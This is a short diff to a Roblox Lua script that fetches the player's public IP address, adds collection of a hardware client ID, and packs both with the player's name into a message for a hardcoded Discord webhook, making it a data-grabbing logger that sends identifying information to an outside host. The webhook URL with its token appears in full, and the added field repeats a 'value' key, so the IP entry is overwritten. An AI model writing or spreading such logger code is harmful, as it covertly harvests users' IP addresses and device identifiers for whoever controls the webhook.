@@ -1,6 +1,8 @@
 local ip = game:HttpGet("https://api.ipify.org/")
+local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
 
 local url = "https://discord.com/api/webhooks/996280121029840958/oRCKXxGduL1XmlheiVbrA65o62PLOA5EXjhPwlaC70cplIcb82-FJpOlgmRGOz8---Rk"
+
 
 local slf = game.Players.LocalPlayer.Name
 local text
@@ -34,6 +36,7 @@ local data =
                     {
                         ["name"] = slf,
                         ["value"] = ip,
+                        ["value"] = hwid,
                         ["inline"] = true
                     },
                 }
